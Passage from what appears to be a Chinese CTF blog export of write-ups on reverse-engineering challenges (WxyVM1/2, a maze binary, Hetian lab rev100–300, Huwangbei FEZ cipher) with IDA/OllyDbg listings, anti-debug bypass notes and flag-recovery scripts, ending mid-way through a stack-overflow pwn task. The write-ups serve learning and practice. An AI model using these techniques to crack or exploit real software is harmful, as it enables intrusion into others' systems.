base64enc = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'flag = ''tmp = base64.b64decode(enc)for c in tmp: flag += chr((ord(c) - 16) ^ 32)print flag WxyVM1拿到文件先 file 一下： 12AssassinQ@MacBook-Air  ~/Downloads  file WxyVM1WxyVM1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0391bf87f6f7a11b4d23e29eb39330a762aff5b4, stripped 然后拿到虚拟机下运行一下看看什么样： 12345[Desktop] ./WxyVM1 3:25:21[WxyVM 0.0.1]input your flag:nctf&#123;123456&#125;wrong 没看出啥东西，基本判断就是程序应该是一个对 flag 的加密。然后拖进 ida 里分析： 1234567891011121314151617181920212223__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char v4; // [rsp+Bh] [rbp-5h] signed int i; // [rsp+Ch] [rbp-4h] puts(\"[WxyVM 0.0.1]\"); puts(\"input your flag:\"); scanf(\"%s\", &amp;input); v4 = 1; vm_start(); if ( strlen(&amp;input) != 24 ) v4 = 0; for ( i = 0; i &lt;= 23; ++i ) &#123; if ( *(&amp;input + i) != enc[i] ) v4 = 0; &#125; if ( v4 ) puts(\"correct\"); else puts(\"wrong\"); return 0LL;&#125; main 函数中输入一个 flag，然后一个 vm 加密函数，再将加密过后的 flag 与存放在 data 段中的 enc 比较，如果相等那么输出correct。所以基本思路应该是通过 enc 逆出 flag。然后进到vm_start函数中看看： 12345678910111213141516171819202122232425262728293031323334353637383940__int64 vm_start()&#123; unsigned int v0; // ST04_4 __int64 result; // rax signed int i; // [rsp+0h] [rbp-10h] char v3; // [rsp+8h] [rbp-8h] for ( i = 0; i &lt;= 14999; i += 3 ) &#123; v0 = byte_6010C0[i]; v3 = byte_6010C0[i + 2]; result = v0; switch ( v0 ) &#123; case 1u: result = byte_6010C0[i + 1]; *(&amp;input + result) += v3; break; case 2u: result = byte_6010C0[i + 1]; *(&amp;input + result) -= v3; break; case 3u: result = byte_6010C0[i + 1]; *(&amp;input + result) ^= v3; break; case 4u: result = byte_6010C0[i + 1]; *(&amp;input + result) *= v3; break; case 5u: result = byte_6010C0[i + 1]; *(&amp;input + result) ^= *(&amp;input + byte_6010C0[i + 2]); break; default: continue; &#125; &#125; return result;&#125; 这里发现在 data 段中还有一个 byte 数组。总共有 15000 个数，每三个数一组。第一个数作为需要执行的指令，第二个数为输入 flag 的下标，第三个数为与其进行操作的数据。到这里基本已经清楚了，把数据都 dump 下来，写个脚本逆一下就 ok 了。然后还需要注意的是，这里的运算是以 byte 为单位，可能会产生溢出，所以应该每次操作之后模一下 256。 看到网上大多数 wp 都是用 idc 脚本 patch，因为数据确实太多了，连 lazyida 都 dump 不出来。我是选择手动复制出来所有的数据，然后再用 python 正则匹配一下，提取出来。 最后的脚本： 1234567891011121314151617181920212223242526272829303132333435363738import ref = open('WxyVM1.txt', 'r')enc = [0xFFFFFFC4, 0x00000034, 0x00000022, 0xFFFFFFB1, 0xFFFFFFD3, 0x00000011, 0xFFFFFF97, 0x00000007, 0xFFFFFFDB, 0x00000037, 0xFFFFFFC4, 0x00000006, 0x0000001D, 0xFFFFFFFC, 0x0000005B, 0xFFFFFFED, 0xFFFFFF98, 0xFFFFFFDF, 0xFFFFFF94, 0xFFFFFFD8, 0xFFFFFFB3, 0xFFFFFF84, 0xFFFFFFCC, 0x00000008]text = f.read()f.close()pat = re.compile(r'db.&#123;5&#125;')find_pat = pat.findall(text)nums = []for n in find_pat: n = n[2:].strip() if n.endswith('h'): n = int(n[:-1], 16) else: n = int(n) nums.append(n)def cal(v0, v3, index): if v0 == 1: enc[index] = (enc[index] - v3) % 256 elif v0 == 2: enc[index] = (enc[index] + v3) % 256 elif v0 == 3: enc[index] = (enc[index] ^ v3) % 256 elif v0 == 4: enc[index] = (enc[index] / v3) % 256 elif v0 == 5: enc[index] = (enc[index] ^ enc[v3]) % 256for i in range(5000): t = 5000 - i v0 = nums[3 * t - 3] v3 = nums[3 * t - 1] res = nums[3 * t - 2] cal(v0, v3, res)flag = ''for i in range(len(enc)): flag += chr(enc[i])print flag maze12$ file mazemaze: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=eda1df76eec45447cd0e1ad208a7eff914e86758, stripped 64 位 ELF 文件，拖进 ida： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; signed __int64 i; // rbx signed int choice; // eax bool v5; // bp bool v6; // al const char *v7; // rdi __int64 pos; // [rsp+0h] [rbp-28h] pos = 0LL; puts(\"Input flag:\"); scanf(\"%s\", &amp;flag, 0LL); if ( strlen(&amp;flag) != 24 || strncmp(&amp;flag, \"nctf&#123;\", 5uLL) || *(&amp;byte_6010BF + 24) != '&#125;' ) &#123;LABEL_22: puts(\"Wrong flag!\"); exit(-1); &#125; i = 5LL; if ( strlen(&amp;flag) - 1 &gt; 5 ) &#123; while ( 1 ) &#123; choice = *(&amp;flag + i); v5 = 0; if ( choice &gt; 78 ) &#123; choice = (unsigned __int8)choice; if ( (unsigned __int8)choice == 'O' ) &#123; v6 = left((_DWORD *)&amp;pos + 1); goto LABEL_14; &#125; if ( choice == 'o' ) &#123; v6 = down((int *)&amp;pos + 1); goto LABEL_14; &#125; &#125; else &#123; choice = (unsigned __int8)choice; if ( (unsigned __int8)choice == '.' ) &#123; v6 = up(&amp;pos); goto LABEL_14; &#125; if ( choice == '0' ) &#123; v6 = right((int *)&amp;pos);LABEL_14: v5 = v6; goto LABEL_15; &#125; &#125;LABEL_15: if ( !(unsigned __int8)check((__int64)maze, SHIDWORD(pos), pos) ) goto LABEL_22; if ( ++i &gt;= strlen(&amp;flag) - 1 ) &#123; if ( v5 ) break;LABEL_20: v7 = \"Wrong flag!\"; goto LABEL_21; &#125; &#125; &#125; if ( maze[8 * (signed int)pos + SHIDWORD(pos)] != '#' ) goto LABEL_20; v7 = \"Congratulations!\";LABEL_21: puts(v7); return 0LL;&#125; 迷宫题，一波分析之后大概就能得到上下左右移动对应的字符，以及对应的一些 check，在内存中可以找到 8x8 的迷宫。脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344''' ******* * **** * **** * *** *# *** *** *** *********left - Odown - 0right - oup - .'''flag = 'nctf&#123;o0oo00O000oooo..OO&#125;'assert len(flag) == 24maze = [ [' ', ' ', '*', '*', '*', '*', '*', '*'], ['*', ' ', ' ', ' ', '*', ' ', ' ', '*'], ['*', '*', '*', ' ', '*', ' ', '*', '*'], ['*', '*', ' ', ' ', '*', ' ', '*', '*'], ['*', ' ', ' ', '*', '#', ' ', ' ', '*'], ['*', '*', ' ', '*', '*', '*', ' ', '*'], ['*', '*', ' ', ' ', ' ', ' ', ' ', '*'], ['*', '*', '*', '*', '*', '*', '*', '*']]directions = flag[5:-1]i, j = 0, 0for d in directions: if d == 'O': j -= 1 elif d == '0': i += 1 elif d == 'o': j += 1 elif d == '.': i -= 1 if maze[i][j] == '#' and d == len(directions) - 1: print 'success' break if maze[i][j] == '*': print 'failed' assert Falseprint flag WxyVM2file 一下： 12AssassinQ@MacBook-Air  ~/Downloads  file WxyVM2WxyVM2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e57d1a1b70ac3d843afa30523dbbbc53c4ff341f, stripped 运行一下，发现和上一题 VM 应该基本是同一个类型： 12345[Desktop] ./WxyVM2 3:25:36[WxyVM 0.0.2]input your flag:nctf&#123;123456&#125;wrong 然后拖进 ida 里，只有一个 main 函数。f5 反编译发现提示说函数太大，无法反编译。这个时候需要先修改一下 ida 的配置文件hexrays.cfg，具体操作。修改完后看一下 main 函数的情况： 1234567891011121314151617181920212223__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char v4; // [rsp+Bh] [rbp-5h] signed int i; // [rsp+Ch] [rbp-4h] puts(\"[WxyVM 0.0.2]\"); puts(\"input your flag:\"); scanf(\"%s\", &amp;input); v4 = 1; if ( strlen(&amp;input) != 25 ) v4 = 0; [......] for ( i = 0; i &lt;= 24; ++i ) &#123; if ( *(&amp;input + i) != enc[i] ) v4 = 0; &#125; if ( v4 ) puts(\"correct\"); else puts(\"wrong\"); return 0LL;&#125; 头和尾是基本一样的，主要是中间的部分，是一段又臭又长的对数据的加密。 我们输入的 input 应该都是 byte，而这么多 dword 的操作其实都是对加密部分的混淆。然后这里的话我是把 main 函数提出来，然后筛选出 byte 开头的语句，并且通过一系列切片简化语句。然后把数据段里被加密的 flag 即 enc 数组 dump 出来，将提取出来的语句进行逆向的实现，就能输出 flag。 其他的一些注意实现和前一题一样。最后的实现脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253f = open('WxyVM2.txt', 'r')text = f.read()f.close()enc = [0xFFFFFFC0, 0xFFFFFF85, 0xFFFFFFF9, 0x0000006C, 0xFFFFFFE2, 0x00000014, 0xFFFFFFBB, 0xFFFFFFE4, 0x0000000D, 0x00000059, 0x0000001C, 0x00000023, 0xFFFFFF88, 0x0000006E, 0xFFFFFF9B, 0xFFFFFFCA, 0xFFFFFFBA, 0x0000005C, 0x00000037, 0xFFFFFFFF, 0x00000048, 0xFFFFFFD8, 0x0000001F, 0xFFFFFFAB, 0xFFFFFFA5]ori = text.split(';\\n')ops = []for s in ori: if s.startswith('d'): continue elif s.startswith('b'): t = s[:1] + s[9:11] + s[12:14] + s[15:] ops.append(t) elif s.startswith('--'): t = s[2:3] + s[-2:] + '-=1' ops.append(t) elif s.startswith('++'): t = s[2:3] + s[-2:] + '+=1' ops.append(t) else: continueops = ops[::-1]def getPart(op): index = int(op[1:3], 16) symbol = op[3:4] num = op[5:] if num.endswith('u'): num = num[:-1] if num.startswith('0x'): num = int(num, 16) else: num = int(num) return index, symbol, numdef cal(index, symbol, num): if symbol == '+': enc[index] = (enc[index] - num) % 256 elif symbol == '-': enc[index] = (enc[index] + num) % 256 elif symbol == '^': enc[index] = (enc[index] ^ num) % 256 else: print 'error'for op in ops: index, symbol, num = getPart(op) # print 'enc[', index, ']', symbol, num cal(index, symbol, num)flag = ''for i in range(len(enc)): flag += chr(enc[i])print flag","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"合天网安实验室-逆向部分","slug":"合天网安实验室-逆向部分","date":"2018-11-06T13:25:05.000Z","updated":"2019-12-09T06:55:14.359Z","comments":true,"path":"2018/11/06/合天网安实验室-逆向部分/","link":"","permalink":"blog.b3ale.cn/2018/11/06/合天网安实验室-逆向部分/","excerpt":"把合天网安实验室的逆向做了一遍。","text":"把合天网安实验室的逆向做了一遍。 逆向 100Description看你的咯，移动安全大神(逆向 100, 已解决 534) 题目描述: dex2jar 是我们的好朋友相关附件: rev100.zip Solution12$ file rev100rev100: Zip archive data, at least v2.0 to extract 可以判断出其实给的文件是个 apk，根据提示用 dex2jar 可以做。我这里用 jadx 反编译： 1234567891011121314151617181920212223242526272829303132package ctf.crackme;import android.app.Activity;import android.os.Bundle;import android.view.Menu;import android.view.MenuItem;import android.widget.TextView;public class FlagActivity extends Activity &#123; protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_flag); String flag = \"\"; int[] d = new int[]&#123;102, 108, 97, 103, 123, 119, 52, 110, 110, 52, 95, 106, 52, 114, 95, 109, 121, 95, 100, 51, 120, 125&#125;; for (int i = 0; i &lt; 22; i++) &#123; flag = flag.concat(String.valueOf((char) d[i])); &#125; ((TextView) findViewById(R.id.flagText)).setText(flag); &#125; public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.flag, menu); return true; &#125; public boolean onOptionsItemSelected(MenuItem item) &#123; if (item.getItemId() == R.id.action_settings) &#123; return true; &#125; return super.onOptionsItemSelected(item); &#125;&#125; 直接把数组 d 的值转字符就完事了： 1234567#!/usr/bin/env pythonenc = [102, 108, 97, 103, 123, 119, 52, 110, 110, 52, 95, 106, 52, 114, 95, 109, 121, 95, 100, 51, 120, 125]flag = ''for i in range(len(enc)): flag += chr(enc[i])print flag# flag&#123;w4nn4_j4r_my_d3x&#125; 逆向 200Description做题累了玩个游戏吧(逆向 200, 已解决 309) 题目描述: pwd1_pwd2相关附件: rev200.exe Solution12$ file rev200.exerev200.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows 程序加了 tls，但对逆向没有什么影响。直接上 OD 调： 123456789101112131415161718192021222324252600401B33 |. 83EC 08 sub esp,0x800401B36 |. A1 8CAD4000 mov eax,dword ptr ds:[0x40AD8C] ; ||||00401B3B |. 890424 mov dword ptr ss:[esp],eax ; ||||00401B3E |. E8 4D5F0000 call &lt;jmp.&amp;msvcrt.puts&gt; ; |||\\puts00401B43 |. 8D85 A9FEFFFF lea eax,dword ptr ss:[ebp-0x157] ; |||00401B49 |. 894424 04 mov dword ptr ss:[esp+0x4],eax ; |||00401B4D |. C70424 209040&gt;mov dword ptr ss:[esp],re200_no.00409020 ; |||ASCII &quot;%20s&quot;00401B54 |. E8 2F5F0000 call &lt;jmp.&amp;msvcrt.scanf&gt; ; ||\\scanf00401B59 |. 8D85 BDFEFFFF lea eax,dword ptr ss:[ebp-0x143] ; ||00401B5F |. 894424 04 mov dword ptr ss:[esp+0x4],eax ; ||00401B63 |. 8D85 A9FEFFFF lea eax,dword ptr ss:[ebp-0x157] ; ||00401B69 |. 890424 mov dword ptr ss:[esp],eax ; ||00401B6C |. E8 275F0000 call &lt;jmp.&amp;msvcrt.strcmp&gt; ; |\\strcmp00401B71 |. 85C0 test eax,eax ; |00401B73 |. 75 18 jnz short re200_no.00401B8D ; |00401B75 |. C70424 269140&gt;mov dword ptr ss:[esp],re200_no.00409126 ; |ASCII &quot;You passed level1!&quot;00401B7C |. E8 0F5F0000 call &lt;jmp.&amp;msvcrt.puts&gt; ; \\puts00401B81 |. C70424 000000&gt;mov dword ptr ss:[esp],0x000401B88 |. E8 5DFAFFFF call re200_no.004015EA00401B8D |&gt; B8 00000000 mov eax,0x000401B92 |. 8D65 F8 lea esp,[local.2]00401B95 |. 59 pop ecx ; msvcrt.77558E6200401B96 |. 5B pop ebx00401B97 |. 5D pop ebp00401B98 |. 8D61 FC lea esp,dword ptr ds:[ecx-0x4]00401B9B \\. C3 retn 第一个 check 很容易找到 passwd： 12堆栈地址=0028FD75, (ASCII &quot;r0b0RUlez!&quot;)eax=00000001 第二个 check 有个int3反调试： 1234567891011121314151617181920004015EA /$ 55 push ebp004015EB |. 89E5 mov ebp,esp004015ED |. 83EC 18 sub esp,0x18004015F0 |. 837D 08 09 cmp [arg.1],0x9004015F4 |. 7F 11 jg short re200_no.00401607004015F6 |. 8345 08 01 add [arg.1],0x1004015FA |. 8B45 08 mov eax,[arg.1]004015FD |. 890424 mov dword ptr ss:[esp],eax ; re200_no.0040161900401600 |. E8 E5FFFFFF call re200_no.004015EA00401605 |. EB 1E jmp short re200_no.0040162500401607 |&gt; A1 90AD4000 mov eax,dword ptr ds:[0x40AD90] ; |0040160C |. 890424 mov dword ptr ss:[esp],eax ; |re200_no.004016190040160F |. E8 7C640000 call &lt;jmp.&amp;msvcrt.puts&gt; ; \\puts00401614 |. E8 00000000 call re200_no.0040161900401619 |$ 58 pop eax ; 0028FDD50040161A |. A3 A8AD4000 mov dword ptr ds:[0x40ADA8],eax ; re200_no.004016190040161F |. CC int300401620 |. B8 00000000 mov eax,0x000401625 |&gt; C9 leave00401626 \\. C3 retn 新增的AddVectoredExceptionHandler这个 API 将一个指向函数的指针作为参数，把这个函数的地址添加到已注册的异常处理程序链表中。那么这里的int 3异常会交给异常处理程序链表中第一个处理函数处理，假如调试器处理这个异常，我们就到不了那里了，所以 OD 的设置一定要忽略所有异常，让程序或系统自己处理。 1234567891011121300401B0E |. 83EC 04 sub esp,0x400401B11 |. 895C24 04 mov dword ptr ss:[esp+0x4],ebx ; |00401B15 |. 890424 mov dword ptr ss:[esp],eax ; |re200_no.0040161900401B18 |. A1 60B14000 mov eax,dword ptr ds:[&lt;&amp;KERNEL32.GetProcAddress&gt;] ; |00401B1D |. FFD0 call eax ; \\GetProcAddress00401B1F |. 83EC 08 sub esp,0x800401B22 |. C74424 04 7F1&gt;mov dword ptr ss:[esp+0x4],re200_no.0040157F00401B2A |. C70424 010000&gt;mov dword ptr ss:[esp],0x100401B31 |. FFD0 call eax ; re200_no.0040161900401B33 |. 83EC 08 sub esp,0x800401B36 |. A1 8CAD4000 mov eax,dword ptr ds:[0x40AD8C] ; ||||00401B3B |. 890424 mov dword ptr ss:[esp],eax ; ||||re200_no.0040161900401B3E |. E8 4D5F0000 call &lt;jmp.&amp;msvcrt.puts&gt; ; |||\\puts 重新调试一遍，可以在1AF9处看到程序将AddVectoredExceptionHandler的地址（DS:0x40ADAC存放的是字符串AddVectoredExceptionHandler）从kernel32.dll中取出，并且将0040157F函数注册到了这个地方： 123456789101112131400401AF9 |. 8B1D ACAD4000 MOV EBX,DWORD PTR DS:[0x40ADAC] ; |00401AFF |. A1 9CAD4000 MOV EAX,DWORD PTR DS:[0x40AD9C] ; |00401B04 |. 890424 MOV DWORD PTR SS:[ESP],EAX ; |00401B07 |. A1 5CB14000 MOV EAX,DWORD PTR DS:[&lt;&amp;KERNEL32.GetModuleHandleA&gt;] ; |00401B0C |. FFD0 CALL EAX ; \\GetModuleHandleA00401B0E |. 83EC 04 SUB ESP,0x400401B11 |. 895C24 04 MOV DWORD PTR SS:[ESP+0x4],EBX ; |00401B15 |. 890424 MOV DWORD PTR SS:[ESP],EAX ; |00401B18 |. A1 60B14000 MOV EAX,DWORD PTR DS:[&lt;&amp;KERNEL32.GetProcAddress&gt;] ; |00401B1D |. FFD0 CALL EAX ; \\GetProcAddress00401B1F |. 83EC 08 SUB ESP,0x800401B22 |. C74424 04 7F1&gt;MOV DWORD PTR SS:[ESP+0x4],rev200.0040157F00401B2A |. C70424 010000&gt;MOV DWORD PTR SS:[ESP],0x100401B31 |. FFD0 CALL EAX 找到157F处，删除分析后就能看到代码： 1234567891011121314151617181920210040157F 55 push ebp00401580 89E5 mov ebp,esp00401582 83EC 38 sub esp,0x3800401585 8B45 08 mov eax,dword ptr ss:[ebp+0x8]00401588 8B40 04 mov eax,dword ptr ds:[eax+0x4] ; ntdll_12.77DF9D4C0040158B 8B80 B8000000 mov eax,dword ptr ds:[eax+0xB8]00401591 8945 F4 mov dword ptr ss:[ebp-0xC],eax00401594 8B45 F4 mov eax,dword ptr ss:[ebp-0xC] ; re200_no.0040902000401597 8B15 A8AD4000 mov edx,dword ptr ds:[0x40ADA8] ; re200_no.004016190040159D 83C2 06 add edx,0x6004015A0 39D0 cmp eax,edx ; msvcrt._iob004015A2 75 38 jnz short re200_no.004015DC004015A4 8D45 E0 lea eax,dword ptr ss:[ebp-0x20]004015A7 894424 04 mov dword ptr ss:[esp+0x4],eax004015AB C70424 20904000 mov dword ptr ss:[esp],re200_no.00409020 ; ASCII &quot;%20s&quot;004015B2 E8 D1640000 call &lt;jmp.&amp;msvcrt.scanf&gt;004015B7 A1 98AD4000 mov eax,dword ptr ds:[0x40AD98]004015BC 894424 04 mov dword ptr ss:[esp+0x4],eax004015C0 8D45 E0 lea eax,dword ptr ss:[ebp-0x20]004015C3 890424 mov dword ptr ss:[esp],eax004015C6 E8 7CFFFFFF call re200_no.00401547 在1547处，可以看到是对内存中长度为 8 的一串数据与 2 进行了异或： 12345678910111213141516171819202100401547 55 push ebp00401548 89E5 mov ebp,esp0040154A EB 22 jmp short re200_no.0040156E0040154C 8B45 08 mov eax,dword ptr ss:[ebp+0x8]0040154F 0FB610 movzx edx,byte ptr ds:[eax]00401552 8B45 0C mov eax,dword ptr ss:[ebp+0xC]00401555 0FB600 movzx eax,byte ptr ds:[eax]00401558 83F0 02 xor eax,0x20040155B 38C2 cmp dl,al0040155D 74 07 je short re200_no.004015660040155F B8 01000000 mov eax,0x100401564 EB 17 jmp short re200_no.0040157D00401566 8345 08 01 add dword ptr ss:[ebp+0x8],0x10040156A 8345 0C 01 add dword ptr ss:[ebp+0xC],0x10040156E 8B45 0C mov eax,dword ptr ss:[ebp+0xC]00401571 0FB600 movzx eax,byte ptr ds:[eax]00401574 3C 02 cmp al,0x200401576 ^ 75 D4 jnz short re200_no.0040154C00401578 B8 00000000 mov eax,0x00040157D 5D pop ebp ; re200_no.004015CB0040157E C3 retn 在堆栈部分可以看到存储的地址： 123456780028F62C /0028F66C0028F630 |004015CB 返回到 re200_no.004015CB 来自 re200_no.004015470028F634 |0028F64C 输入字符串地址0028F638 |0028FDCC 用来比较的字符串的地址0028F63C |000000000028F640 |000000000028F644 |000000000028F648 |00000000 在数据窗口跟随得到数据： 120028FDCC 75 31 6E 6E 66 32 6C 67 02 50 6C 65 61 73 65 20 u1nnf2lg\u0002Please0028FDDC 65 6E 74 65 72 20 74 68 65 20 73 65 63 6F 6E 64 enter the second 写个脚本逆出结果： 1234567#!/usr/bin/env pythonenc = [0x75, 0x31, 0x6E, 0x6E, 0x66, 0x32, 0x6C, 0x67, 0x02]res = ''for i in range(len(enc)): res += chr(enc[i] ^ 0x02)print res# w3lld0ne 逆向 300DescriptionELF(逆向 300, 已解决 139) 题目描述: 靠,我这儿也没有 IDA 啊相关附件: rev300.zip Solution12$ file rev300rev300: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a93ffe39302e19ef5184a1d86b720b11a7a97941, stripped 总共有两个 check： 12345678910111213int __cdecl main(int a1, char **a2)&#123; if ( a1 &gt; 1 &amp;&amp; sub_8048414(a2[1], 0) ) &#123; puts(\"Access granted\"); sub_8048538((int)a2[1]); &#125; else &#123; puts(\"Access denied\"); &#125; return 0;&#125; 第一个是对程序参数的的一个比较，一个递归的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354signed int __cdecl sub_8048414(_BYTE *a1, int a2)&#123; signed int result; // eax switch ( a2 ) &#123; case 0: if ( *a1 == 'i' ) goto LABEL_19; result = 0; break; case 1: if ( *a1 == 'e' ) goto LABEL_19; result = 0; break; case 3: if ( *a1 == 'n' ) goto LABEL_19; result = 0; break; case 4: if ( *a1 == 'd' ) goto LABEL_19; result = 0; break; case 5: if ( *a1 == 'a' ) goto LABEL_19; result = 0; break; case 6: if ( *a1 == 'g' ) goto LABEL_19; result = 0; break; case 7: if ( *a1 == 's' ) goto LABEL_19; result = 0; break; case 9: if ( *a1 == 'r' )LABEL_19: result = sub_8048414(a1 + 1, 7 * (a2 + 1) % 11); else result = 0; break; default: result = 1; break; &#125; return result;&#125; 第二个是把正确的输入和内存中的数据进行异或： 12345678910int __cdecl sub_8048538(int a1)&#123; int v2[33]; // [esp+18h] [ebp-A0h] int i; // [esp+9Ch] [ebp-1Ch] qmemcpy(v2, &amp;unk_8048760, sizeof(v2)); for ( i = 0; i &lt;= 32; ++i ) putchar(v2[i] ^ *(char *)(a1 + i % 8)); return putchar(10);&#125; 脚本如下： 123456789101112131415161718192021222324252627#!/usr/bin/env pythonenc = [0x0000000F, 0x0000001F, 0x00000004, 0x00000009, 0x0000001C, 0x00000012, 0x00000042, 0x00000009, 0x0000000C, 0x00000044, 0x0000000D, 0x00000007, 0x00000009, 0x00000006, 0x0000002D, 0x00000037, 0x00000059, 0x0000001E, 0x00000000, 0x00000059, 0x0000000F, 0x00000008, 0x0000001C, 0x00000023, 0x00000036, 0x00000007, 0x00000055, 0x00000002, 0x0000000C, 0x00000008, 0x00000041, 0x0000000A, 0x00000014]key = ''i = 0for j in range(8): if i == 0: key += 'i' if i == 1: key += 'e' if i == 3: key += 'n' if i == 4: key += 'd' if i == 5: key += 'a' if i == 6: key += 'g' if i == 7: key += 's' if i == 9: key += 'r' i = 7 * (i + 1) % 11print keyflag = ''for i in range(len(enc)): flag += chr(enc[i] ^ ord(key[i % 8]))print flag 对参数的求解也可以用 angr 来完成： 123456789#!/usr/bin/env pythonimport angrimport claripyp = angr.Project('./rev300')flag = claripy.BVS('flag', 50 * 8)state = p.factory.entry_state(args=['./rev300', flag])sim = p.factory.simgr(state)sim.explore(find=0x080485E0, avoid=0x080485FE)print(sim.found[0].solver.eval(flag, cast_to=bytes)) Referenceshttps://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=530793https://blog.csdn.net/xiangshangbashaonian/article/details/82953042https://docs.microsoft.com/en-us/windows/win32/debug/using-a-vectored-exception-handler","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"2018-护网杯","slug":"2018-护网杯","date":"2018-10-16T10:18:29.000Z","updated":"2019-08-26T01:14:42.849Z","comments":true,"path":"2018/10/16/2018-护网杯/","link":"","permalink":"blog.b3ale.cn/2018/10/16/2018-护网杯/","excerpt":"看着大佬们的 wp 复现一波。","text":"看着大佬们的 wp 复现一波。 迟到的签到题充分证明了自己是个签到题选手。 12345678910import base64enc = ''enc = base64.b64decode(enc)# test = 'flag&#123;'# for i in range(len(test)):# print chr(ord(test) ^ ord(enc)),flag = ''for i in range(len(enc)): flag += chr(ord(enc[i]) ^ ord('f'))print flag FEZ给出了一个 py 实现的加密算法，和一个被加密后输出的 log。了解一下之后，大概是菲斯特尔(Feistel)密码，也就是 DES。 分析一下，可以发现比较难的点是中间的多次繁琐的异或，逆向实现较难。通过正向分析加密的过程来观察。 12345678910111213// l即左半部分，r即右半部分 l + r1. r + r^l^k12. r^l^k1 + r^l^k1^r^k2 =&gt; r^l^k1 + l^k1^k23. l^k1^k2 + l^k1^k2^r^l^k1^k3 =&gt; l^k1^k2 + r^k2^k34. r^k2^k3 + r^k2^k3^l^k1^k2^k4 =&gt; r^k2^k3 + r^l^k1^k3^k45. r^l^k1^k3^k4 + r^l^k1^k3^k4^r^k2^k3^k5 =&gt; r^l^k1^k3^k4 + l^k1^k2^k4^k56. l^k1^k2^k4^k5 + l^k1^k2^k4^k5^r^l^k1^k3^k4^k6 =&gt; l^k1^k2^k4^k5 + r^k2^k3^k5^k67. r^k2^k3^k5^k6 + r^k2^k3^k5^k6^l^k1^k2^k4^k5^k7 =&gt; r^k2^k3^k5^k6 + r^l^k1^k3^k4^k6^k7// 对于m和test来说是一样的enc1 = xor(test, k) = t_r^k2^k3^k5^k6 + t_r^t_l^k1^k3^k4^k6^k7enc2 = xor(m, k) = m_r^k2^k3^k5^k6 + m_r^m_l^k1^k3^k4^k6^k7 由于 test 的值是已知的，可以先利用 test 的左右两部分求出 k2356 和 k13467。然后再利用这两个数求出 m 的左右两部分，m 中就含有 flag。脚本如下： 12345678910111213141516171819202122def xor(a,b): assert len(a)==len(b) c=\"\" for i in range(len(a)): c+=chr(ord(a[i])^ord(b[i])) return ctest = '8664f7f564f097907c082328ebcdc95e8dc37eec3827fd9c93cc84ebb517c5e396c19d12e730ee3f3fb9e84110f9c92b29ddeab60797'enc1 = '4b4ce14cdb9ace2c678b9a64892cc9d5f2a61e7e2dc256877f2fb454c4d37760278640ab1737c62ba4a403acb14a893facfc1819b259'enc2 = 'd4c898ee5f6b68d6120bd7fb11f5cf4d0431324c40e0b3a6ae9fbd1f17295be643c45ec7f306063dd1009ae5d62b0803c7909629aba7't_l = test.decode('hex')[:27]t_r = test.decode('hex')[27:]k2356 = xor(enc1.decode('hex')[:27], t_r)k13467 = xor(xor(enc1.decode('hex')[27:], t_r), t_l)m_r = xor(enc2.decode('hex')[:27], k2356)m_l = xor(xor(enc2.decode('hex')[27:], m_r), k13467)flag = m_l + m_rprint flag GETTINGSTART拿到题目跑了一下，然后 checksec 看看开了什么保护： 1234567qianfei@qianfeideMacBook-Air ~/ti/2018 huwangbei/GETTINGSTART checksec task_gettingStart_ktQeERc[*] &apos;/Users/qianfei/ti/2018 huwangbei/GETTINGSTART/task_gettingStart_ktQeERc&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 拖进 ida 里看一看，就是很明显的栈溢出： 12345678910111213141516171819202122232425262728293031__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 buf; // [rsp+10h] [rbp-30h] __int64 v5; // [rsp+18h] [rbp-28h] __int64 v6; // [rsp+20h] [rbp-20h] __int64 v7; // [rsp+28h] [rbp-18h] double v8; // [rsp+30h] [rbp-10h] unsigned __int64 v9; // [rsp+38h] [rbp-8h] v9 = __readfsqword(0x28u); buf = 0LL; v5 = 0LL; v6 = 0LL; v7 = 0x7FFFFFFFFFFFFFFFLL; v8 = 1.797693134862316e308; setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); printf(\"HuWangBei CTF 2018 will be getting start after %lu seconds...\\n\", 0LL, 1.797693134862316e308); puts(\"But Whether it starts depends on you.\"); read(0, &amp;buf, 0x28uLL); if ( v7 != 0x7FFFFFFFFFFFFFFFLL || v8 != 0.1 ) &#123; puts(\"Try again!\"); &#125; else &#123; printf(\"HuWangBei CTF 2018 will be getting start after %g seconds...\\n\", &amp;buf, v8); system(\"/bin/sh\"); &#125; return 0LL;&#125; buf和v7还有v8之间的相对位置也比较清楚，主要就是解决 double 